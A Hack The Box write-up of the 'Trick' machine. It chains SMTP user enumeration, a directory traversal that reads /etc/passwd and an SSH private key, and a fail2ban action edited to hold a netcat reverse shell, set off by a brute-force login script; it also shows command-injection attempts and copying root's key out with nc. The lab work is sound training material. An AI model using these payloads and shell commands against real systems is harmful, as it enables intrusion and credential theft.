---
title: "Trick"
date: 2022-08-01T18:00:00-00:00
publishdate: 2023-02-18T18:00:00-00:00
releasedate: 2022-06-18T00:00:00-00:00
draft: false
hideTitle: false
Cover: /htb-info-cards/Trick.png
icon: /htb-box-icons/Trick.png
toc: true
tags: ["SMTP", "CVE", "VHost Enumeration", "Directory Traversal", "Fail2Ban"]
categories: ["Walkthrough", "HTB", "Linux", "Easy"]
---

## INTRODUCTION

Trick appears to be a website that is under construction. At first glance, there is no functionality, but a little enumeration will reveal much more. Finding a foothold is not too difficult as long as proper enumeration techniques are followed. While this is an "Easy" box, the path to root takes a lot of creativity and forethought, and a bit of scripting. You're fighting against a system that is trying to protect itself, but there is a way in!

![home page](home%20page.png)



## RECON

I set RADDR to the target IP address, then began with my typical "init" scan:

```bash
sudo nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR
```

However, this yielded no results at all.

I then proceeded to a ping scan instead:

```
└─$ sudo nmap -Pn -oA nmap/port-scan $RADDR
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 18:32 EDT
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.035s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

22 (ssh), 53 (dns), and 80 (http) are expected. SMTP is less common, and may indicate some extra mail-sending functionality.

##### http

Seeing port 80, I added the address to trick.htb in my /etc/hosts file and proceeded with subdomain fuzzing using **ffuf**:

```bash
WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
ffuf -w $WLIST:FUZZ -u http://FUZZ.trick.htb/
```

No result. I'll try vhost fuzzing instead:

```bash
ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H 'Host: FUZZ.trick.htb'
```

Only ran that for a few seconds to note that all responses are of size 5480. Filter these out:

```bash
ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H 'Host: FUZZ.trick.htb' -fs 5480
```

Still nothing.

Ok, I think it's safe to say we are dealing with a pretty simple http server that has outgoing email.

Next, let's try signing up for their notifications:

![signup email](signup%20email.png)

It appears to be a Form service that is not connected to anything.

Next, I performed directory enumeration using **feroxbuster**. This yielded the following directories:

- /js
- /css
- /assets
- /assets/img

I checked the http server info using a whatweb query:

```bash
whatweb http://trick.htb
```

This confirmed that the site uses bootstrap, and gave a specific version of nginx: 1.14.2. This appears to be a legacy version of nginx, succeeded by version 1.16 (changelog [here](https://nginx.org/en/CHANGES-1.16)) and several versions by now. The only notable security change that I saw since 1.14.2 was this:

> ```
> Security: processing of a specially crafted mp4 file with the
>        ngx_http_mp4_module might result in worker process memory disclosure
>        (CVE-2018-16845).
> ```



### DNS

I did the steps mentioned at the [bottom of the DNS hacktricks page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#hacktricks-automatic-commands)

dig returned a possibly interesting result. Why do they have a CNAME record for `preprod-payroll.trick.htb`? :

![dig result](dig%20result.png)

I'm not sure what its purpose is. I decided to revisit this later after investigating SMTP.



### SMTP

I ran the smtp enumeration nmap script

```bash
nmap -p25 -oA nmap/smtp --script smtp-commands $RADDR
```

![nmap smtp enum](nmap%20smtp%20enum.png)

Following the advice of the [SMTP hacktricks page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp), I tried logging into the smtp server using telnet.

```bash
telnet $RADDR 25
```

I did not know what all the smtp status codes were, so I checked the [wiki](https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes). There was an example shown at the bottom of that wiki article showing how to interact with the server using these codes. Noting that the nmap enumeration showed `ENHANCEDSTATUSCODES` I referred to the bottom example for sending a message. I also tried checking some users (root, admin, mailto).

> 💡 If this worked, then perhaps the usernames could be enumerated using this VRFY command..?

```
└─$ telnet $RADDR 25                                                                            
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220
220 debian.localdomain ESMTP Postfix (Debian/GNU)
502 5.5.2 Error: command not recognized
VRFY root
252 2.0.0 root
VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
VRFY mailto
550 5.1.1 <mailto>: Recipient address rejected: User unknown in local recipient table
MAIL FROM:<gerf>          
250 2.1.0 Ok                                                                                    
RCPT TO:<fake@fake.com>                                                                        
454 4.7.1 <fake@fake.com>: Relay access denied                                                               
DATA                                                                                            
554 5.5.1 Error: no valid recipients                                                            
RCPT TO:<root>                                                                                  
250 2.1.5 Ok                                                                                    
DATA                                                                                            
354 End data with <CR><LF>.<CR><LF>                                                             
Well hello there                                                                                
This is a test email message                                                                    
.                                                                                               
250 2.0.0 Ok: queued as A182E4099C                                                              
QUIT                                                                                            
221 2.0.0 Bye                                                                                   
Connection closed by foreign host.
```

That's somewhat interesting. It seems like emails can be sent anonymously as long as they are internal. If I can enumerate the users on the box, maybe I can leak some kind of info by sending an email from root to that user?

The following interaction with the smtp server shows that we could also use the RCPT TO:<username> to enumerate users on the box! I tested this by knowing that `root` exists but `tbd_username` does not:

```
└─$ telnet $RADDR 25                                                                                                                                                                             1 ⨯
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM:<root>
250 2.1.0 Ok
RCPT TO:<tbd_username>
550 5.1.1 <tbd_username>: Recipient address rejected: User unknown in local recipient table
RCPT TO:<root>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Hi root, I'm root. How are you today?
.
250 2.0.0 Ok: queued as B7DD84099C
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

To investigate this idea, I checked through metasploit to see if somebody has already tried this method. As it turns out, it already has a module! `auxiliary/scanner/smtp/smtp_enum` 🎉

```
use auxiliary/scanner/smtp/smtp_enum
show info          <------- By default it is using a very short list of probable unix usernames.
set RHOSTS 10.10.11.166
run
```

The scan eventually finished, and showed the following users:

```
Users found: , _apt, avahi, backup, bin, colord, daemon, dnsmasq, games, geoclue, gnats, hplip, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, pulse, rtkit, saned, speech-dispatcher, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tss, usbmux, uucp, www-data
```

This is kind of a long list, and I'm bad at comparing lists visually, so I wrote a script to compare this list of users to my own /etc/passwd file (to filter out the known/expected users on the box). This is **compare_users_list.sh**:

```bash
#!/bin/bash

LIST="_apt, avahi, backup, bin, colord, daemon, dnsmasq, games, geoclue, gnats, hplip, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, pulse, rtkit, saned, speech-dispatcher, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tss, usbmux, uucp, www-data"

IFS=", "

for usr in $LIST;
do
	found=$(grep $usr /etc/passwd)
	if [ "$found" = "" ]; then
		echo $usr
	fi
done
```

After running this script, the users that weren't present in my own /etc/passwd were:

- dnsmasq
- hplip
- postfix
- postmaster

`dnsmasq`, `postfix`, and `postmaster` make sense. But what's this `hplip`?

Googling this username showed that it is the user for "[HP's Linux Imaging and Printing software (HPLIP)](https://developers.hp.com/hp-linux-imaging-and-printing)". Ok, it's a driver. Drivers aren't always very secure - maybe this one isn't?



### HPLIP

Checking searchsploit revealed something juicy. Maybe it'll work:

![searchsploit hplip](searchsploit%20hplip.png)

I looked up the [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5208). This definitely might be applicable for this box:

> hpssd in Hewlett-Packard Linux Imaging and Printing Project (hplip) 1.x  and 2.x before 2.7.10 allows context-dependent attackers to execute  arbitrary commands via shell metacharacters in a from address, which is  not properly handled when invoking sendmail.

Naturally, HPLIP is not exposed to the internet right now, so running this exploit through metasploit did not work. However, from the CVE description it sounds like maybe this could work by interacting with smtp over telnet instead.

Here is an excerpt from the exploit code ``linux/remote/16837.rb``:

```ruby
connect

#cmd = "nohup " + payload.encoded
cmd = payload.encoded

username = 'root'
toaddr = 'nosuchuser'

# first setalerts
print_status("Sending 'setalerts' request with encoded command line...")
msg = "username=#{username}\n" +
	"email-alerts=1\n" +
	#"email-from-address=`#{cmd}`\n" +
	"email-from-address=x;#{cmd};\n" +
	"email-to-addresses=#{toaddr}\n" +
	"msg=setalerts\n"
sock.put(msg)

# next, the test email command
print_status("Sending 'testemail' request to trigger execution...")
msg = "msg=testemail\n"
sock.put(msg)
```

Ok, so maybe I can telnet to the smtp server, and try sending an email with a malformed FROM address. Specifically, I'll send it from ``x;nc 10.10.14.4 4444; `` (after setting up a netcat listener on my attacker machine). If we get a response, it worked.

Hmm, looks like it won't be quite that easy:

```
MAIL FROM:hplip;nc 10.10.14.4 4444;
501 5.1.7 Bad sender address syntax
```

The original exploit `linux/remote/16837.rb` looks like it's encoding the payload. I used ``od`` to encode mine:

```bash
echo -n "nc 10.10.14.4 4444" | od -A n -t x1 | sed 's/ /\\x/g'
```

These were the responses to my various attempts:

```
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
500 5.5.2 Error: bad syntax
MAIL FROM:root;nc 10.10.14.4 4444;\n
501 5.1.7 Bad sender address syntax
MAIL FROM:root;nc 10.10.14.4 4444;
501 5.1.7 Bad sender address syntax
MAIL FROM:root;\x6e\x63\x20\x31\x30\x2e\x31\x30\x2e\x31\x34\x2e\x34\x20\x34\x34
\x34\x34501 5.1.7 Bad sender address syntax
MAIL FROM:root;\x6e\x63\x20\x31\x30\x2e\x31\x30\x2e\x31\x34\x2e\x34\x20\x34\x34;\n
501 5.1.7 Bad sender address syntax
MAIL FROM:root;id;
501 5.1.7 Bad sender address syntax
MAIL FROM:root;id;\n
501 5.1.7 Bad sender address syntax
MAIL FROM:<root;id;>
501 5.1.7 Bad sender address syntax
MAIL FROM:<root;id;\n>
501 5.1.7 Bad sender address syntax
MAIL FROM:<root;;>
250 2.1.0 Ok
QUIT
221 2.0.0 Bye
Connection closed by foreign host.

```

None of these variations worked. I might end up revisiting this idea later, but at this point I decided to pursue other leads.



### Revisiting preprod-payroll.trick.htb

I added ``preprod-payroll.trick.htb`` to my ``/etc/hosts`` file (as if it had turned up in the original subdomain fuzzing) and tried directory enumeration against it, once again using **feroxbuster**:

![preprod-payroll directory enumeration](preprod-payroll%20directory%20enumeration.png)

Well THAT looks very promising :happy:

/login page is shown below:

![preprod-payroll directory login page](preprod-payroll%20directory%20login page.png)

I tried common SQLi auth bypass strings in the username field, no result. Also tried common SQLi polyglots in the username field, also no result. Next I tried ``sqlmap``

SQLMap did not produces any significant results. When attempting to check SQLi using POSTs on the login form, I got false positives from many tests. However, these were just the server replying with an error code. Oh well, was worth a shot.

Looking for other easy ways to bypass the login, I perused the login page's source code.

(Also, I opened up Burp and set my scope to preprod-payroll.trick.htb. I'm can be somewhat haphazard in my testing, so Burp helps me organize all the requests I fire off)

```bash
curl --proxy="127.0.0.1:8080" preprod-payroll.trick.htb
curl --proxy="127.0.0.1:8080" preprod-payroll.trick.htb/login.php
```

As it turns out, requests to ``preprod-payroll.trick.htb`` provide ``index.php`` before redirecting to ``login.php``. By default, Burp then generated a site map of the subdomain. By exploring this auto-generated site map, we can see what the application looks like:

![index.php rendered through burp](index.php%20rendered%20through%20burp.png)

Burp also logged several links within index.php:

![preprod sitemap](preprod%20sitemap.png)

By sending these pages to Burp Repeater, we can even get their context. Shown below is ``page=employee``:

![employee page rendered through burp](employee page rendered through burp.png)

Viewing the employee page's source revealed some interesting functionality: perhaps we can use it to generate a new user!

```php
<script type="text/javascript">
		$(document).ready(function(){
			$('.edit_employee').click(function(){
				var $id=$(this).attr('data-id');
				uni_modal("Edit Employee","manage_employee.php?id="+$id)

			});
			$('.view_employee').click(function(){
				var $id=$(this).attr('data-id');
				uni_modal("Employee Details","view_employee.php?id="+$id,"mid-large")

			});
			$('#new_emp_btn').click(function(){
				uni_modal("New Employee","manage_employee.php")
			})
			$('.remove_employee').click(function(){
				_conf("Are you sure to delete this employee?","remove_employee",[$(this).attr('data-id')])
			})
		});
		function remove_employee(id){
			start_load()
			$.ajax({
				url:'ajax.php?action=delete_employee',
				method:"POST",
				data:{id:id},
				error:err=>console.log(err),
				success:function(resp){
						if(resp == 1){
							alert_toast("Employee's data successfully deleted","success");
								setTimeout(function(){
								location.reload();

							},1000)
						}
					}
			})
		}
	</script>
```

Changing back to my browser, I tried requesting ``manage_employee.php`` (connected to ``#new_emp_btn``). It corresponds to the page we just saw the source code for. The form seemed straightforward, but the Position field had all options disabled. Thankfully, this was just a matter of changing the DOM from within the browser, removing the ``disabled`` property on each <option>:

![test employee](test employee.png)

Oddly enough, the form is also missing its submit() function. This is what it should be:

```javascript
$('#employee_frm').submit(function(e){
				e.preventDefault()
				start_load();
			$.ajax({
				url:'ajax.php?action=save_employee',
				method:"POST",
				data:$(this).serialize(),
				error:err=>console.log(),
				success:function(resp){
						if(resp == 1){
							alert_toast("Employee's data successfully saved","success");
								setTimeout(function(){
								location.reload();

							},1000)
						}
				}
			})
		})
```

I manually created a POST request in Burp Repeater for this and submitted it. This is the result:

![add user error](add user error.png)

Ok... Not the result I was looking for, but at least now we know more about the directory structure.

> 💡 But it does remind me of something important... you can't have a company without more than just payroll. I realized that I forgot to refine my VHost fuzzing after finding the suspicious preprod-**payroll**.trick.htb from DNS enumeration.
>

Taking another crack at VHost fuzzing using the known pattern of preprod-XXX.trick.htb:

```bash
WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
ffuf -w $WLIST:FUZZ -u http://trick.htb -H 'Host: preprod-FUZZ.trick.htb' -t 100 -fs 5480
```

![vhost fuzzing again](vhost fuzzing again.png)

🤦‍♂ Of course! why didn't I think of checking that earlier.

> I try not to beat myself up over doing things in the wrong order, but it can sure be frustrating to realize I neglected something staring right at me!
>
> The thing to remember here is to take good notes, and when you get stuck *read them back to yourself*.
>
> Often on an 'Easy' HTB box, if you get stuck after finding something that looks like a good result, it means you may have missed a hint in an earlier step. Critical thinking about your own process can be very valuable.

I added ``preprod-marketing.trick.htb`` to my ``/etc/hosts`` file and to my Burp scope.



## FOOTHOLD

### preprod-marketing.trick.htb

![preprod-marketing](preprod-marketing.png)

At first glance, the site seems pretty much static. There is a contact page. This is the result of my directory enumeration:

```bash
feroxbuster --url http://preprod-marketing.trick.htb -x php
```

![marketing feroxbuster](marketing feroxbuster.png)

After navigating around the site for a bit, I noticed a big hint: the URI  of each page, ex.

```http
http://preprod-marketing.trick.htb/index.php?page=home.html
```

This looked like a candidate for directory traversal. Already knowing (from the errors showing ``/var/www/payroll/admin_class.php``) that this was probably being read from a directory like ``/var/www/marketing/index.php``, I tried using directory traversal tricks going (at least) three directories up:

- http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd
- http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd

And that did it! The second attempt was enough to leak ``/etc/passwd``:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash
```

Well hello there, **michael** 👋 Are you the target?

As it turns out, *michael is definitely the target*. Or at least, they have the flag:

```http
http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././home/michael/user.txt
```

Wonderful!

If I can access michael's home directory (and ssh is open) there's a good chance I can also access michael's ssh key. Taking a guess at the typical location of the ssh key worked perfectly:

```http
http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
```

Hooray 🎉 That worked! Only the formatting of the ssh key is not idea. I'll use curl to dump it into a file directly, instead:

```bash
curl http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././home/michael/.ssh/id_rsa -o id_rsa
```

Now, set proper file permissions on the key (ssh will complain / remind you if you don't), and log in via ssh:

```bash
chmod 600 id_rsa
ssh michael@trick.htb -i id_rsa
```

![logged in as michael](logged in as michael.png)



## USER FLAG

### User: michael

To make privilege escalation easier, I decided to serve my "small toolbox" over to the target machine. To do this, I hosted a python ``http.server`` with the following tools

```
www
├── chisel
├── index.html
├── LinEnum.sh
├── linpeas.sh
└── pspy
```

```bash
sudo ufw allow from 10.10.11.166 to any port 8000 proto tcp
cd www
python3 -m http.server 8000
```

Noting down my IP address with ``ifconfig tun0``, I downloaded my toolbox from my http server as michael:

```bash
mkdir /tmp/tools
curl -O 10.10.14.5:8000/pspy
curl -O 10.10.14.5:8000/LinEnum.sh
curl -O 10.10.14.5:8000/linpeas.sh
chmod u+x ./*
```

I then took a look at michael's $PATH and cross referenced against locations they can write to:

```bash
id
echo $PATH
find / -user michael 2>/dev/null | grep -v proc
find / -group security 2>/dev/null | grep -v proc
```



### linpeas

Next, I ran `linpeas.sh` to see if there were any easy PE vectors. Some notes on what linpeas showed:

- sudo version 1.8.27
  - Possibly vulnerable to a sudo vulnerability mentioned [here in Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-less-than-v1.28)
    - Checked it; nope not vulnerable
  - Possibly vulnerable to another sudo vulnerability [described here](https://www.deepwatch.com/labs/sudo-vulnerability/).
    - Downloaded a git repo with PoC code to my attacker box, compiled the code, transferred it using ``http.server`` (this time using `wget -r` )from my attacker machine to the target machine
    - Ran the code; nope not vulnerable
- michael has ``/var/mail``. Maybe it's time to reattempt the smtp exploit
- root is running ``postfix``. Maybe another reason to check out the smtp exploit
- system is using ``anacron`` instead of  ``cron``
- listening on `MySQL` on tcp port 3306 and `IPP` (Internet Printing Protocol) on tcp port 631
- michael can `sudo /etc/init.d/fail2ban restart`
- ``/usr/bin/gettext.sh`` is in the PATH
- Might be a good idea to check ``/var/www/payroll/database/payroll.sql`` for credential reuse
- Also check out ``/var/www/payroll/admin_class.php`` and ``/var/www/payroll/login.php``



### pspy

The following shows the output of pspy after running for a few minutes:

![pspy](pspy.png)



## ROOT FLAG

### Fail2Ban

Perhaps there is a way to use fail2ban to escalate? pspy showed that /root/fail2ban is being backed-up to /etc, so I can at least take a look at what's inside. Also since michael is in the ``security`` group, it's worth checking out ``/etc/fail2ban/action.d``

Fail2Ban appears to have had a pretty severe CVE leading to code execution: [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm). However, this git repo shows that ``mail`` is used, and ``mail`` is not present on this box. Neither is the leading alternative ``sendmail``... neither are the less-common alternatives ``mutt`` nor ``ssmtp``.

💡But wait, maybe that telnet trick that I used earlier would be enough to exploit CVE-2021-32749 ?

First, I set up a nc listener and checked if a netcat reverse shell would even work on this box (sometimes they don't have the -e flag):

On attacker:

```bash
nc -lvnp 4444
```

On target:

```bash
nc 10.10.14.5 4444 -e /bin/sh
```

![nc test](nc test.png)

Yep, that's successful. Now let's see if we can get root using the same trick? We already know root is running postfix, so perhaps we can use this CVE to get a root reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ telnet $RADDR 25                                                                                                                                                                             1 ⨯
Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: root
250 2.1.0 Ok
RCPT TO: michael
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Michael, I'm sending you an email\n~! nc 10.10.14.5 4444 -e /bin/sh

.
250 2.0.0 Ok: queued as B36C741221
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

To check if the email was delivered, I used ``mailq``. Indeed it was delivered, but no reverse shell appeared...

Ok, that's too bad, but I still think fail2ban is a solid lead. We already saw that the ``/etc/fail2ban/action.d`` directory is writable by michael. So maybe it is possible to create a new fail2ban action that will acquire us the root shell.

> At this point, I had to go research how fail2ban is used and configured. For this, I found the following resources useful:
>
> - https://linuxhandbook.com/fail2ban-basic/
> - https://webcp.io/custom-fail2ban-action/

It looks like ``/etc/fail2ban/jail.conf`` would have to be modified to be able to use a custom action. I think modifying an existing action is probably the best option. However, it looks like there aren't any jails enabled:

```bash
grep -B 20 -A 10 "enabled = true" jail.conf
```

But then again, within ``jail.d`` there is a single entry enabling an sshd jail. Maybe it is as simple as making a new custom jail sshd.conf containing my reverse shell?

This is the entry in ``jail.conf`` for ``sshd``:

```
#
# SSH servers
#

[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

But further down is where it references what the default action to be taken is:

```
[DEFAULT]

#
# MISCELLANEOUS OPTIONS
#

# "ignorself" specifies whether the local resp. own IP addresses should be ignored
# (default is true). Fail2ban will not ban a host which matches such addresses.
#ignorself = true

# "ignoreip" can be a list of IP addresses, CIDR masks or DNS hosts. Fail2ban
# will not ban a host which matches an address in this list. Several addresses
# can be defined using space (and/or comma) separator.
#ignoreip = 127.0.0.1/8 ::1

# External command that will take an tagged arguments to ignore, e.g. <ip>,
# and return true if the IP is to be ignored. False otherwise.
#
# ignorecommand = /path/to/command <ip>
ignorecommand =

# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5

[...some stuff...]

#
# Action shortcuts. To be used to define action parameter

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports
```

Ok, so maybe instead of a custom action, I should be using ``/etc/fail2ban/action.d/iptables-multiport.conf``

First, I tried simply putting my reverse shell inside the actionstart and actionstop sections of the .conf file:

![fail2ban conf edited](fail2ban conf edited.png)

Then I restarted the service:

```bash
sudo /etc/init.d/fail2ban restart
```

but... still no reverse shell 😕

Next, I tried putting my reverse shell inside of the unban action instead. But now I need to find a way to get banned. As seen previously in ``jail.conf``, I will be banned by performing 5 failed authentication attempts in a 10 second span. That's tricky, actually I think that's impossible if trying to log in the naive way. Instead, I tried make at least 5 login attempts at once using a python script:

```python
!/usr/bin/python3

from subprocess import Popen, PIPE

def attempt_login():
    proc = Popen(['ssh', "root@trick.htb"], stdin = PIPE)
    proc.stdin.write(b'not_a_password')
    proc.stdin.flush()

for i in range(10):
    attempt_login()
```

So the plan of attack is as follows, and it has to be very quick:

1. modify  ``/etc/fail2ban/action.d/iptables-multiport.conf`` to have a ban action set to my reverse shell, instead of the default ban action

2. As michael, perform ``/etc/init.d/fail2ban restart`` to enact the changes to fail2ban configuration

3. From my attacker machine, make a bunch of failed login attempts as fast as possible using my python script

4. 🙏 pray for reverse shell

5. If I get it, quickly grab the flag. I need to be faster than the anacron job that overwrites ``/etc/fail2ban``.



Performing the above steps worked perfectly! 🎉 root shell acquired!

![got_root](got_root.png)

... for like 5 whole seconds. Then the connection was terminated 😞

So to get a ***persistent*** root shell, I repeated the above steps. This time quickly copying-over root's ssh key into a place michael can access:

![nabbed root ssh key](nabbed root ssh key.png)

Super, let's try transferring that file over and logging in now.

> At this point, I realized I forgot to change the file owner! So even though michael can see the key, they cant access it. I performed the attack again, getting a new reverse shell, this time changing the file owner:
>
> ```bash
> chown michael:michael /home/michael/id_rsa.root
> ```

Then I transferred the file using nc:

(on the attacker box)

```bash
nc -lvnp 4444 > root_id_rsa
```

(as michael)

```bash
nc -nv 10.10.14.5 4444 < id_rsa.root
```

Then on my attacker machine I changed the key's permissions with ``chmod 700 root_id_rsa`` and logged in:

![root shell over ssh](root shell over ssh.png)

YES! Finally a nice solid ssh connection as root🎉



## LESSONS LEARNED

{{% lessons-learned attacker=true %}}

### Attacker

- **Take good notes; think critically** about what you wrote down. It may sound obvious, but this is the #1 way I've wasted time on HTB boxes: by accidentally passing over some small piece of information that I had already discovered, and forgetting to go back and check it. For this box, I almost missed enumerating the VHost that created a foothold.

- **Re-enumerate when you find a new piece of the attack surface**. It's easy to fall into the trap of thinking of enumeration as one big contiguous step - this is not the case at all. Whenever you discover a new domain, a new service, a new user, or a new API, it is essential to fully enumerate the thing you found. Keeping a methodical mindset will save lots of time in the long run.

- **Recognize when users or services seem out-of-place**. Even a print service can have a juicy exploit. This technique mostly comes with experience, but it is also good to have a "normal" computer around to compare the target to, to establish a bit of a baseline.

- **Privilege escalation takes creativity**. Sometimes, the trick to privesc is trying to think of the weirdest way to use what's in front of you.  If you abstract the tools/services you have available into their functional components, sometimes you can think of a good way to string them together into privilege escalation. In this case, it came down to finding a way to get myself banned with Fail2Ban to execute some commands that I myself had planted: so weird! But when you take a step back, it's not so odd:

    -- Fail2Ban can execute code when banning a user.

    -- I can determine arbitrary code that runs Fail2Ban executes.

    -- I can find a way to ban myself.

  ​      ==> *By hypothetical syllogism, I can execute arbitrary code*.

  {{% /lessons-learned %}}

{{% lessons-learned defender=true %}}

### Defender

- **Printer driver updates are actually useful** - who knew? An administrator isn't necessarily a security expert: they should opt to defer their judgement to the vendor that produces
- **Internal users shouldn't be trusted universally**. It was clear that Fail2Ban was meant to be used for external login attempts, but a more clever system of permissions or capabilities could have kept `michael` from abusing Fail2Ban.
- **Clean up after yourself**. The vulnerabilities for this box were all found on pre-production vhosts. These vhosts should not have been exposed to the internet: at most, they should have been exposed to an internal port. This is as simple as updating a couple of DNS records, but is easy to accidentally overlook.
- **Prevent directory traversals on the webserver**. They are always preventable. There are many ways to do this, including the server configuration files and WAFs. Find something that works for your situation and apply it.
- **Keep on top of your updates**. Both HPLIP and Fail2Ban had vulnerabilities disclosed in CVEs, that had since been patched. Using a stronger update policy could have prevented both services from being attacked.
  {{% /lessons-learned %}}
